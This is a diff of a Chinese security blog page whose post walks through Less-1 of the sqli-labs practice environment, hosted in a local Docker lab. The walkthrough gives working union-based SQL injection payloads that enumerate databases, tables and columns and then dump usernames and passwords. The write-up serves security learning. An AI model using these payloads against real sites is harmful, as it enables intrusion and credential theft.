@@ -8,10 +8,10 @@
   <meta name="description" content>
   <meta name="author" content="ST0new">
   <!-- Open Graph Data -->
-  <meta property="og:title" content="ST0new的小站">
+  <meta property="og:title" content="sql-lab 复现通关（深入学习）">
   <meta property="og:description" content="一个ctfer，web渗透测试小白">
   <meta property="og:site_name" content="ST0new的小站">
-  <meta property="og:type" content="website">
+  <meta property="og:type" content="article">
   <meta property="og:image" content="http://yoursite.com">
   
     <link rel="alternate" href="/atom.xml" title="ST0new的小站" type="application/atom+xml">
@@ -43,7 +43,7 @@
     <div class="row">
       <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
         <div class="page-title with-background-image">
-          <p class="title">Untitled Post</p>
+          <p class="title">sql-lab 复现通关（深入学习）</p>
           <p class="subtitle"></p>
         </div>
         <div class="site-menu with-background-image">
@@ -100,15 +100,34 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2019-10-04</span>
-            <span class="time">10:15:14</span>
+            <span class="time">10:22:27</span>
           </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/web安全/">web安全</a>
+</span>
           
         </div>
         <!-- Tags -->
         
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/sql注入/">#sql注入</a>
+
+
+          </div>
+        
         <!-- Post Main Content -->
         <div class="post-content">
-          <h1 id="sql-lab-复现通关（深入学习）"><a href="#sql-lab-复现通关（深入学习）" class="headerlink" title="sql-lab 复现通关（深入学习）"></a>sql-lab 复现通关（深入学习）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqllab 从基础到复杂， 对于初学者练习非常有用。</p>
+          <p>Docker 搭建环境 sql-labs 通关</p>
+<a id="more"></a>
+
+
+
+<h1 id="sql-lab-复现通关（深入学习）"><a href="#sql-lab-复现通关（深入学习）" class="headerlink" title="sql-lab 复现通关（深入学习）"></a>sql-lab 复现通关（深入学习）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqllab 从基础到复杂， 对于初学者练习非常有用。</p>
 <h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>学习如何进攻才能懂得如何防守</p>
 <h2 id="less-1-基于错误的单引号字符串"><a href="#less-1-基于错误的单引号字符串" class="headerlink" title="less-1 基于错误的单引号字符串"></a>less-1 基于错误的单引号字符串</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">http://192.168.248.134:8080/Less-1/?id=1</span><br><span class="line"></span><br><span class="line">- 添加 ' </span><br><span class="line">	返回报错信息：You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your     MySQL  <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 使用 1'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> %<span class="number">23</span></span><br><span class="line">	得到列数为<span class="number">3</span></span><br><span class="line"></span><br><span class="line">- 使用<span class="keyword">union</span> 获取<span class="keyword">admin</span>和<span class="keyword">password</span></span><br><span class="line">	<span class="number">-1</span> 的作用是查询不存在的值，使得结果为空</span><br><span class="line">	<span class="number">-1</span> <span class="string">' union select 1,2,3 // 确定可以显示到页面的位置</span></span><br><span class="line"><span class="string">	-1 '</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata // 得到数据库名 或 通过<span class="keyword">database</span>() 获取数据库名</span><br><span class="line">	<span class="number">-1</span> <span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = '</span><span class="keyword">security</span><span class="string">' %23</span></span><br><span class="line"><span class="string">	-1 '</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'users'</span>%<span class="number">23</span></span><br><span class="line">	<span class="number">-1</span> <span class="string">' union select 1,username,password from users %23</span></span><br></pre></td></tr></table></figure>
 
